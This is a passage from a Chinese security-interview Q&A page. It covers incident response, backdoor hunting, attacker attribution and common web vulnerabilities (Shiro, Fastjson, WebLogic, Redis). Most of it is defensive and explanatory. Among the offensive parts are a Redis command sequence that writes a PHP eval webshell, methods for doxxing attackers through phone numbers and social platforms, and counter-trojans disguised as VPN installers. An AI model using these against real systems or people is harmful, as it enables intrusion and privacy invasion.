查询已安装的服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ chkconfig  --list # 查看服务自启动状态$ ps aux | grep crond  # 查看当前服务# 系统在3与5级别下的启动项 # 中文环境$ chkconfig --list | grep "3:启用\|5:启用"# 英文环境$ chkconfig --list | grep "3:on\|5:on"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><ul><li><p>源码安装的服务</p><p>搜索 <code>/etc/rc.d/init.d</code> 目录，查看是否存在。</p></li></ul></li></ul><p><strong>文件分析</strong></p><p>查找、查看文件创建修改时间、访问时间、文件权限 ACL</p><ul><li><p>查找</p><ul><li>找出 <code>/opt</code> 下一天前访问过的文件：<code>find /opt -iname "*" -atime 1 -type f</code></li><li>查找一天内被修改的 <code>jsp</code> 文件：<code>find ./ -mtime 0 -name "*.jsp"</code></li><li>查看 <code>72</code> 小时内新增的文件：<code>find / -ctime -2</code></li><li>查看 <code>777</code> 权限的文件：<code>findd / *.jsp -perm 4777</code></li><li>查看更改时间：<code>stat  [文件]</code></li></ul></li><li><p>查看文件创建修改时间、访问时间</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ls -alt /bin/* | head -n 5$ stat /usr/bin/lsof<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>文件权限 ACL</p><p>获取文件权限：<code>getfacl 1.cap</code></p><p>添加文件权限：<code>setfacl</code></p></li></ul><p><strong>日志分析</strong></p><p>日志目录、日志分析、软件卸载安装日志</p><ul><li><p>日志目录</p><ul><li><p>日志默认存放位置：<code>/var/log</code> 日志配置情况：<code>more /etc/rsyslog.conf</code></p><pre class="line-numbers language-none"><code class="language-none">/var/log/cron #记录了系统定时任务相关的日志/var/log/cups #记录打印信息的日志/var/log/dmesg #记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息/var/log/mailog #记录邮件信息/var/log/message #记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件/var/log/btmp #记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看/var/log/lastlog #记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看/var/log/wtmp #永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看/var/log/utmp #记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询/var/log/secure #记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>日志分析</p><ul><li><p>ssh 查看 IP 爆破主机 root 账号情况</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 定位IP$ grep "Failed password for root" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -# 查看爆破的字典$ grep "Failed password" /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print "$1\n";}'| uniq -c | sort -nr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>查看登录成功的 IP</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more# 登录成功的日期、用户名、IP：$ grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>用户操作</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 添加用户$ grep "useradd" /var/log/secure# 删除用户$ grep "userdel" /var/log/secure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>软件卸载安装日志：<code>more /var/log/yum.log</code></li></ul><p><strong>病毒查杀工具</strong></p><ul><li><p>查杀 Rootkit：chkrootkit、rkhunter</p></li><li><p>病毒查杀：clamav</p></li><li><p>升级病毒库：<code>end-inline-katex--&gt; /opt/clamav/bin/freshclam</code></p></li><li><p>扫描所有用户的主目录：`c194a9eg</p></li><li><p>扫描 <code>bin</code> 目录并且显示有问题的文件的扫描结果：<code>end-inline-katex--&gt; ./clamscan -r --bell -i /bin</code></p></li><li><p>扫描：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log$ clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log$ clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><p>扫描并杀毒：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ clamscan -r --remove  /usr/bin/bsd-port$ clamscan -r --remove  /usr/bin/$ clamscan -r --remove  /usr/local/zabbix/sbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>扫描并杀毒：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ clamscan -r  --remove  /usr/bin/bsd-port$ clamscan -r  --remove  /usr/bin/$ clamscan -r --remove  /usr/local/zabbix/sbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><ul><li>查看日志发现：`c194a9eg</li></ul></li></ul><h3 id="问二十一：常见windows系统后门排查"><a href="#问二十一：常见windows系统后门排查" class="headerlink" title="问二十一：常见windows系统后门排查"></a>问二十一：常见windows系统后门排查</h3><ol><li>工具列表： Pchunter 恶意代码检测工具</li><li>后门排查思路：<br>注册表启动项<br>恶意进程<br>系统服务<br>网络连接<br>计划任务  </li><li>思路一：  Shift 粘滞键后门<br>检查 <code>C:\Windows\sysytem32\sethc.exe</code> 或者 按 5 下 Shift 键</li><li>思路二：NTFS（ADS）数据流（后门或者 WebShell）<br>检查方法：<br>\1. 使用 “dir \r” 检查目标目录中是否存在使用 NTFS 数据流隐藏的文件 2. 如果存在，就使用 “notpad 文件名：NTFS 隐藏文件名” 来查看隐藏的文件的内容是什么。 <code>dir /r /s</code> 连带子目录的文件一起检查</li><li>思路三：系统日志 查看是否存在恶意登陆情况 1. 使用 Logparser 格式化后进行分析 2. 直接打开 winodws 控制面板 - 管理工具 - 事件查看器进行分析，比如我们要筛选是否存在。 3389 rdp 暴力破解行为的话，只要在 “安全” 日志中筛选事件 ID 为 4624（登陆成功）和 4625 （登陆失败）</li></ol><h3 id="问二十二：常见linux系统后门排查"><a href="#问二十二：常见linux系统后门排查" class="headerlink" title="问二十二：常见linux系统后门排查"></a>问二十二：常见linux系统后门排查</h3><ol><li>检查异常帐号 <code>cat /etc/passwd</code></li><li>检查异常登陆： <code>who</code> 查看当前登陆用户 (tty 本地登陆、pts 远程登陆) <code>w</code> 查看当前系统信息，想知道某一刻用户的行为 <code>last</code> 列出所有用户登陆信息 <code>lastb</code> 列出所有用户登陆失败的信息 <code>lastlog</code> 列出所有用户最近一次登陆信息</li><li>查看历史命令： <code>cat ~/.bash_history</code></li><li>网络连接： <code>netstat -pant1</code></li><li>查看进程： <code>ps -ef | more</code> 锁定实际运行程序的符号链接 <code>ls -la /prc//exe</code> <code>lsof -p </code></li><li>计划任务： <code>crontab -l</code>  列出计划任务列表 <code>crontab -e</code>  编辑计划任务，当计划任务出现不可字符时，需要此命令才能看到具体信息 <code>ls -la /var/spool/cron/</code>  查看计划任务文件 <code>more /etc/crontab</code></li><li>系统启动项： <code>more /etc/rc.local</code> <code>ls -l /etc/rc.d/rc[0~6].d</code>  优先看 rc3.d <code>more /etc/ld.so.preload</code>  linux 动态链接库</li><li>系统日志： <code>/var/log/secure</code>  SSH 登陆日志、su 切换用户日志，只要涉及帐号和密码的程序都会记录 <code>/var/log/message</code>  记录系统重要信息的日志，这个日志文件中会记录 Linux 系统的绝大多数重要信息 <code>/var/log/cron</code>  计划任务日志 <code>/var/log/wtmp</code>  记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件，这个文件是二进制文件用 last</li><li>Rootkit 查杀： <code>chkrootkit</code> <code>rkhunter</code></li></ol><h3 id="问二十三：溯源技巧"><a href="#问二十三：溯源技巧" class="headerlink" title="问二十三：溯源技巧"></a>问二十三：溯源技巧</h3><p>对外溯源：确认攻击者的真实身份 </p><p>对内溯源：确认攻击者的行为 对内溯源 对内主要是溯源攻击者的行为，如果攻击者已经攻击成功了，攻击者肯定要上传攻击工具的，看一下他上传的什么工具。第一时间对其进行阻断，把 shell  先暂时干掉。干掉的同时，再去看外部日志 Apache 日志。通过攻击者上传 shell 的时间和攻击  IP，去索引搜索整个日志，然后看攻击者做了哪些请求，如果是 Get 请求可以看对方请求的一个资源、地址以及请求的内容；如果说是 Post  请求，攻击者应该是做了一些上传的操作，但是具体上传了什么东西，是不知道的，只能看到一个上传数据包，  不过可以通过防火墙去下载该完整的数据包，进行分析。 再之后，就进入了应急响应的一个流程。 对外溯源 <em>通过监测设备上面确定攻击 IP，确定是攻击者发起的请求，那么就通过这个 IP 确定域名，通过该域名查找到关于攻击者注册域名的一些相关信息。</em>通常会有 QQ 账号、QQ 邮箱等个人真实信息，再借助这些有效信息去社工。</p><p>通常情况下，接到溯源任务时，获得的信息如下：</p><pre class="line-numbers language-none"><code class="language-none">攻击时间攻击 IP预警平台攻击类型恶意文件受攻击域名/IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中攻击 IP、攻击类型、恶意文件、攻击详情是溯源入手的点。</p><p>通过攻击类型分析攻击详情的请求包，看有没有攻击者特征，通过获取到的 IP 地址进行威胁情报查询来判断所用的 IP 具体是代理 IP 还是真实 IP 地址。</p><p>如端口扫描大概率为个人 vps 或空间搜索引擎，在接到大量溯源任务时可优先溯源。</p><p>如命令执行大概率为未经任何隐匿的网络、移动网络、接到脚本扫描任务的肉鸡，在接到大量溯源任务时可优先溯源。</p><p>如爬虫大概率为空间搜索引擎，可放到最后溯源。 </p><p>如恶意文件可获得 c2 地址、未删除的带有敏感信息的代码（如常用 ID、组织信息）、持续化控制代码（C2 地址指在 APT 攻击里的命令与控制，若获取到 C2 地址可以使我们的溯源目标更有针对性） </p><p>持续化控制代码需要详细分析，如采用 DGA 域名上线的方法，分析出域名算法，预测之后的域名可有效减少损失，增加溯源面。</p><p><strong>攻击痕迹清晰</strong></p><ul><li>安全设备分析（若有）</li><li>系统日志分析</li></ul><p>目的：获取对方攻击的时间节点，攻击方式，获取病毒文件，拿到攻击者的虚拟身份，最后攻击者复现</p><p><strong>攻击痕迹不清晰</strong></p><p>进行漏洞挖掘</p><p>相关人员询问</p><h3 id="问二十四：溯源反制"><a href="#问二十四：溯源反制" class="headerlink" title="问二十四：溯源反制"></a>问二十四：溯源反制</h3><p>在发现资产被攻击之后，防守方需要及时进行溯源和排查，通常情况下，溯源需要获取到目标攻击者的一部分个人信息，比如手机号，邮箱，QQ 号，微信号等，通过这些信息在互联网可以进一步追溯攻击者的画像。</p><ul><li>比如拿到数据：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">web攻击事件-11攻击时间: 2021-08-17 09:09:99攻击IP : 49.70.0.xxx预警平台：天眼/绿盟/ibm/长亭waf攻击类型: 植入后门文件处置方式: 封禁需溯源目标域名: 10.0.0.1www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>流程</li></ul><p>1、针对 IP 通过开源情报 + 开放端口分析查询</p><p>首先通过威胁情报平台确认攻击 ip 是否为威胁 ip，常用的平台通常有如下</p><pre class="line-numbers language-none"><code class="language-none">https://x.threatbook.cn/ 微步在线威胁情报社区https://ti.qianxin.com/ 奇安信威胁情报中心https://ti.360.cn/ 360威胁情报中心https://www.venuseye.com.cn/  VenusEye威胁情报中心// 域名反查站长之家IP查询网址：https://ip.tool.chinaz.com/ipbatchIP138查询网：https://www.ip138.com/高精度IP定位：https://www.opengps.cn/Data/IP/LocHighAcc.aspxIP信息查询：https://www.ipip.net/ip.html/IP地址查询在线工具：https://tool.lu/ip/多地Ping检测：http://ping.chinaz.com/Whois查询：https://whois.chinaz.com/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当发现 IP 的为攻击 IP 后，可以尝试通过此 IP 去溯源攻击者，具体实现过程通常会用到下述方法： </p><ol><li>ip 反查域名</li><li>域名查 whois 注册信息</li><li>域名查备案信息、反查邮箱、反查注册人 <a href="http://whoissoft.com/">http://whoissoft.com/</a></li><li>邮箱反查下属域名</li><li>注册人反查下属域名</li></ol><p>然后，在端口：我们可以可查看一些开放服务进行进一步利用</p><p>再通过 nmap 对开放端口进行识别</p><pre class="line-numbers language-none"><code class="language-none">nmap -p 3389,3306,6378 -Pn IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>7001/7002</th><th>WebLogic 控制台</th><th>反序列化、控制台弱口令</th></tr></thead><tbody><tr><td>3389</td><td>RDP 远程端口连接</td><td>shift 后门、爆破、ms12-020、CVE-2019-0708</td></tr><tr><td>6379</td><td>Redis 数据库</td><td>可尝试为授权访问、弱口令爆破</td></tr><tr><td>27017/27018</td><td>MongoDB 数据库</td><td>爆破、未授权访问</td></tr><tr><td>3306</td><td>Mysql 数据库</td><td>注入、提权、爆破</td></tr><tr><td>1521</td><td>Oracle 数据库</td><td>TNS 爆破、注入、反弹 shell</td></tr><tr><td>53</td><td>DNS 域名服务器</td><td>允许区域传送、DNS 劫持、缓存投毒、欺骗、CVE-2020-1350</td></tr><tr><td>21</td><td>FTP 文件传输协议</td><td>允许匿名的上传、下载、爆破和嗅探操作</td></tr><tr><td>22</td><td>SSH 远程连接</td><td>爆破、SSH 隧道及内网代理转发、文件传输</td></tr><tr><td>23</td><td>Telnet 远程连接</td><td>爆破、嗅探、弱口令</td></tr><tr><td>25</td><td>SMTP 邮件服务</td><td>邮件伪造</td></tr></tbody></table><p><strong>2、查询定位</strong></p><p>通过蜜罐等设备获取真实 IP，对 IP 进行定位，可定位具体位置。</p><p>定位 IP 网站：<a href="https://www.opengps.cn/Data/IP/ipplus.aspx">https://www.opengps.cn/Data/IP/ipplus.aspx</a></p><p><strong>3、得到常用 ID 信息收集：</strong></p><p>(1) 百度信息收集：“id” （双引号为英文）</p><p>(2) 谷歌信息收集</p><p>(3) src 信息收集（各大 src 排行榜，如果有名次交给我套路）</p><p>(4) 微博搜索（如果发现有微博记录，可使用 tg 查询 weibo 泄露数据）</p><p>(5) 微信 ID 收集：微信进行 ID 搜索（直接发钉钉群一起查）</p><p>(6) 如果获得手机号（可直接搜索支付宝确定目标姓氏、淘宝找回密码确定目标名字、社交账户等）</p><p>注意：获取手机号如果自己查到的信息不多，直接上报企业微信 / 钉钉群（利用共享渠道对其进行二次社工）</p><p>(7) 豆瓣 / 贴吧 / 知乎 / 脉脉 你能知道的所有社交平台，进行信息收集</p><p><strong>4、预警设备信息取证：</strong></p><p>上方数据一无所获，可考虑对其发起攻击的行为进行筛查，尝试判断其是否有指纹特征。</p><p>如看看不能上传 webshell ，在 webshell 中植入 probe.js，在 webshell 中增加 canvas 探针，获取  CPU，主板什么信息，如果对方用的 chrome 的话，并存在 Chrome UAF 0day ，CS 免杀客户端获得微信 ID</p><p><strong>5、跳板机信息收集（触发）：</strong></p><p>进入红队跳板机查询相关信息</p><p>如果主机桌面没有敏感信息，可针对下列文件进行信息收集</p><p>last：查看登录成功日志</p><p>cat ~/.bash_history  ：查看操作指令</p><p>ps -aux #查看进程</p><p>查看是否有类似 ID 的用户</p><p>重点关注 uid 为 500 以上的登录用户</p><p>nologin 为不可登录</p><p>注意：手机号、昵称 ID 均为重点数据，如查不到太多信息，直接上报指挥部。</p><ul><li><p>附:</p><ul><li><p>攻击者上传了恶意程序的话：</p><p>如果攻击者在恶意攻击过程中对目标资产上传攻击程序（如后门、恶意脚本、钓鱼程序等），我们可通过对攻击者上传的恶意程序进行分析，并通过 IP 定位等技术手段对攻击进行分析溯源，常用的恶意程序分析网站有：</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">微步在线云沙箱：https://s.threatbook.cn/腾讯哈勃：https://habo.qq.com/Virustotal：https://www.virustotal.com/gui/home/upload火眼：https://fireeye.ijinshan.com魔盾安全分析：https://www.maldun.com/analysis/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><ul><li><p>如果攻击者被蜜罐捕获的话：</p><p>蜜罐技术本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。</p><ul><li><p>蜜罐溯源的两种常见方式：</p><p>一种是在伪装的网站上插入特定的 js 文件，该 js 文件使用攻击者浏览器中缓存的 cookies 去对各大社交系统的 JSONP、XSS、CSRF 接口获取攻击者的 ID  和手机号等。另一种是在伪装的网站上显示需要下载某插件，该插件一般为反制木马，控制了攻击者的主机后查询敏感文件、浏览器访问记录等个人敏感信息从而锁定攻击者。</p></li></ul></li></ul></li></ul><h3 id="问二十五：邮件钓鱼如何反制"><a href="#问二十五：邮件钓鱼如何反制" class="headerlink" title="问二十五：邮件钓鱼如何反制"></a>问二十五：邮件钓鱼如何反制</h3><p>我们防守的客户单位就收到了钓鱼邮件，庆幸的是客户总体安全意识很强，加上有邮件沙箱的加持，并没有实际人员中招，而我们将计就计，部署一套虚假的内网环境，伪造钓鱼邮件中招假象，中招人员画像和机器环境编排：</p><p><strong>名字：</strong>许晋 （jinxu）</p><p><strong>身份：</strong>巡检职员</p><p><strong>平时上机内容：</strong>看视频、打游戏、巡检</p><p><strong>系统软件：</strong>Office 三件套，搜狗输入法，QQ, 微信，Xmind, 谷歌浏览器，Winrar, 迅雷，百度网盘，Everything, 爱奇艺，腾讯视频，QQ 音乐，网易云音乐，FastStone Capture….</p><p><strong>系统环境：</strong>除了部署一些常见的系统软件，我们还要创建一系列工作文档（手工伪造、由客户提供非敏感公开数…），并在众多的工作文档中携带了我们部署的免杀后门（伪装成 VPN 安装包或办公软件）。</p><p><strong>目的：</strong>点开钓鱼邮件的附件，假装中招后，让攻击者在翻当前 PC 机器的时候寻找到我们投下的假密码本，并结合 VPN 安装包，使得攻击者下载 VPN 安装包并进行安装，从而进行反向控制。</p><h1 id="三、漏洞相关"><a href="#三、漏洞相关" class="headerlink" title="三、漏洞相关"></a>三、漏洞相关</h1><h3 id="问二十六：打点一般会用什么漏洞"><a href="#问二十六：打点一般会用什么漏洞" class="headerlink" title="问二十六：打点一般会用什么漏洞"></a>问二十六：打点一般会用什么漏洞</h3><p>优先以 java 反序列化这些漏洞像 shiro，fastjson，weblogic，用友 oa 等等进行打点，随后再找其他脆弱性易打进去的点。</p><p>因为 javaweb 程序运行都是以高权限有限运行，部分可能会降权。</p><h3 id="问二十七：-描述外网打点的流程？"><a href="#问二十七：-描述外网打点的流程？" class="headerlink" title="问二十七： 描述外网打点的流程？"></a>问二十七： 描述外网打点的流程？</h3><p>靶标确认、信息收集、漏洞探测、漏洞利用、权限获取。最终的目的是获取靶标的系统权限 / 关键数据。在这个过程中，信息收集最为重要。掌握靶标情报越多，后续就会有更多的攻击方式去打点。比如：钓鱼邮件、web 漏洞、边界网络设备漏洞、弱口令等。</p><h3 id="问二十八：什么是钓鱼网站？"><a href="#问二十八：什么是钓鱼网站？" class="headerlink" title="问二十八：什么是钓鱼网站？"></a>问二十八：什么是钓鱼网站？</h3><p>网络钓鱼攻击者利用欺骗性的电子邮件和伪造的 Web  站点来进行诈骗活动，受骗者往往会泄露自己的财务数据，如信用卡号、帐户用户名和口令等内容。诈骗者通常会将自己伪装成知名银行、在线零售商和信用卡公司等可信的站点，在所有接触诈骗信息的用户中，有高达 5% 的人都会对这些骗局做出响应 。 </p><h3 id="问二十九：你漏洞利用过没？"><a href="#问二十九：你漏洞利用过没？" class="headerlink" title="问二十九：你漏洞利用过没？"></a>问二十九：你漏洞利用过没？</h3><p>有一个 redis 的未授权访问漏洞，redis 在默认的情况下会绑定在 0.0.0.0:6379,  如果防火墙没有做策略限制，则外网可以访问到 redis 上，如果没有设置 redis  密码（默认为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis  的数据（这对于用于验证码码来说威胁很大），而且攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config  命令像目标主机写 WebShell、写 SSH 公钥、创建计划任务反弹 Shell 等。</p><h3 id="问三十：常见的中间件漏洞有那些？"><a href="#问三十：常见的中间件漏洞有那些？" class="headerlink" title="问三十：常见的中间件漏洞有那些？"></a>问三十：常见的中间件漏洞有那些？</h3><p>IIS</p><pre class="line-numbers language-none"><code class="language-none">PUT漏洞、短文件名猜解、远程代码执行、解析漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Apache</p><pre class="line-numbers language-none"><code class="language-none">解析漏洞、目录遍历<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Nginx</p><pre class="line-numbers language-none"><code class="language-none">文件解析、目录遍历、CRLF注入、目录穿越<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Tomcat</p><pre class="line-numbers language-none"><code class="language-none">远程代码执行、war后门文件部署<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>JBoss</p><pre class="line-numbers language-none"><code class="language-none">反序列化漏洞、war后门文件部署<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>WebLogic</p><pre class="line-numbers language-none"><code class="language-none">反序列化漏洞SSRF任意文件上传war后门文件部署<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Apache Shiro 反序列化漏洞</p><pre class="line-numbers language-none"><code class="language-none">Shiro rememberMe（Shiro-550） Shiro Padding Oracle Attack(Shiro-721)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="问三十一：平常怎么去发现-Shiro-漏洞的？"><a href="#问三十一：平常怎么去发现-Shiro-漏洞的？" class="headerlink" title="问三十一：平常怎么去发现 Shiro 漏洞的？"></a>问三十一：平常怎么去发现 Shiro 漏洞的？</h3><p>Apache Shiro 是一个 Java 安全框架，执行身份验证、授权、密码和会话管理。apacheShiro 框架提供了记住我（RememberMe）的功能，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。</p><p>shiro 反序列化漏洞：shiro 在 CookieRememberMeManaer 类中将 cookie 中 rememberMe  字段内容分别进行序列化、AES 加密、Base64 编码操作。攻击者构造一个恶意的对象，并且对其序列化，AES 加密，base64 编码后，作为 cookie 的 rememberMe 字段发送。Shiro 将 rememberMe 进行解密并且反序列化，最终造成反序列化漏洞。</p><p>登陆失败时候会返回 rememberMe=deleteMe 字段或者使用 shiroScan 被动扫描去发现</p><p>完整：</p><p>未登陆的情况下，请求包的 cookie 中没有 rememberMe 字段，返回包 set-Cookie 里也没有 deleteMe 字段</p><p>登陆失败的话，不管勾选 RememberMe 字段没有，返回包都会有 rememberMe=deleteMe 字段</p><p>不勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe=deleteMe 字段。但是之后的所有请求中 Cookie 都不会有 rememberMe 字段</p><p>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe=deleteMe 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段</p><p>shiro 有几种漏洞类型</p><p>shiro 550</p><p>shiro 721</p><p>Apache Shiro 框架提供了记住我的功能（RemeberMe），用户登录成功后会生成经过加密并编码的 cookie。cookie 的 key 为  RemeberMe，cookie 的值是经过对相关信息进行序列化，然后使用 aes 加密，最后在使用 base64 编码处理形成的</p><p>在服务端接收 cookie 值时，按以下步骤解析：</p><blockquote><p>检索 RemeberMe cookie 的值</p><p>Base 64 解码</p><p>使用 ACE 解密（加密密钥硬编码）</p><p>进行反序列化操作（未作过滤处理）</p></blockquote><p>在调用反序列化的时候未进行任何过滤，导致可以触发远程代码执行漏洞</p><p>用户登陆成功后会生成经过加密并编码的  cookie，在服务端接收 cookie 值后，Base64 解码 –&gt;AES 解密 –&gt; 反序列化。攻击者只要找到 AES  加密的密钥，就可以构造一个恶意对象，对其进行序列化 –&gt;AES 加密 –&gt;Base64 编码，然后将其作为 cookie 的  rememberMe 字段发送，Shiro 将 rememberMe 进行解密并且反序列化，最终造成反序列化漏洞。</p><h3 id="问三十二：WebLogic-权限绕过的姿势？"><a href="#问三十二：WebLogic-权限绕过的姿势？" class="headerlink" title="问三十二：WebLogic 权限绕过的姿势？"></a>问三十二：WebLogic 权限绕过的姿势？</h3><p><code>CVE-2020-14883</code> 是一个 <code>Console</code> 的未授权访问，而 <code>CVE-2020-14883</code> 是在利用未授权访问的前提下，在 <code>Console</code> 进行代码执行，于是远程攻击者可以构造特殊的 <code>HTTP</code> 请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code> ，并在 <code>WebLogic Server Console</code> 执行任意代码。</p><p>1、 通过静态资源来绕过权限验证，防止被重定向到登陆界面。</p><p>2、 通过请求 <code>.portal</code> ，控制处理的 <code>Servlet</code> 是渲染 <code>UI</code> 的 <code>MBeanUtilsInitSingleFileServlet</code> 。</p><p>3、 通过编码后的 <code>../</code> ，让最终渲染的模版是 <code>console.portal</code> 。</p><p>综合起来，才造成了最终的未授权访问。</p><h3 id="问三十三：Fastjson-漏洞利用原理？"><a href="#问三十三：Fastjson-漏洞利用原理？" class="headerlink" title="问三十三：Fastjson 漏洞利用原理？"></a>问三十三：Fastjson 漏洞利用原理？</h3><p>在请求包里面中发送恶意的 json 格式 payload，漏洞在处理 json 对象的时候，没有对 @type 字段进行过滤，从而导致攻击者可以传入恶意的  TemplatesImpl 类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes 生成 java  实例，这就达到 fastjson 通过字段传入一个类，再通过这个类被生成时执行构造函数。</p><p>FastJson 是一个由阿里巴巴研发的 java 库，可以把 java 对象转换为 JSON 格式，也可以把 JSON 字符串转换为对象。</p><p>通俗理解就是：漏洞利用 fastjson autotype 在处理 json 对象的时候，未对 @type 字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程 rmi 主机，通过其中的恶意类执行代码。</p><p>攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大影响。</p><p>Fastjson RCE 的本质就是在反序列化时会调用目标类的 setter 方法。以 com.sun.rowset.JdbcRowSetImpl Gadget 为例，类中的 setAutoCommit 方法中通过 connect 方法调用了 lookup 方法，且 lookup 方法的参数又能通过  setDataSourceName 方法设置，即其参数可控。那么就会导致 JNDI 注入，最终实现任意命令执行。</p><p>Java 处理 Json 格式数据有三个比较流行的类库：</p><ul><li>Gson (google 维护) </li><li>Jackson</li><li>Fastjson</li></ul><h3 id="问三十四：简述一下Redis-未授权访问漏洞。"><a href="#问三十四：简述一下Redis-未授权访问漏洞。" class="headerlink" title="问三十四：简述一下Redis 未授权访问漏洞。"></a>问三十四：简述一下Redis 未授权访问漏洞。</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将  Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取  Redis 的数据。攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config 命令像目标主机写  WebShell、写 SSH 公钥、创建计划任务反弹 Shell 等。其思路都是一样的，就是先将 Redis 的本地数据库存放目录设置为 web 目录、~/.ssh 目录或 /var/spool/cron 目录等，然后将  dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行 save 或 bgsave  保存，则我们就指定的目录里写入指定的文件了。</p><p>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网。 没有设置密码认证（一般为空），可以免密码远程登录 redis 服务。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config set dir /var/www/html/ config set dbfilename shell.phpset xxx "&lt;?php eval($_POST[whoami]);?&gt;" save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="问三十五：Redis-未授权访问漏洞如何利用？"><a href="#问三十五：Redis-未授权访问漏洞如何利用？" class="headerlink" title="问三十五：Redis 未授权访问漏洞如何利用？"></a>问三十五：Redis 未授权访问漏洞如何利用？</h3><blockquote><p>服务端的 Redis 连接存在未授权，在攻击机上能用 redis-cli 直接登陆连接，并未登陆验证。 开了服务端存在 Web 服务器，并且知道 Web 目录的路径（如利用 phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限。</p></blockquote><h3 id="问三十六：讲一下MongoDB-未授权访问漏洞"><a href="#问三十六：讲一下MongoDB-未授权访问漏洞" class="headerlink" title="问三十六：讲一下MongoDB 未授权访问漏洞"></a>问三十六：讲一下MongoDB 未授权访问漏洞</h3><p> <a 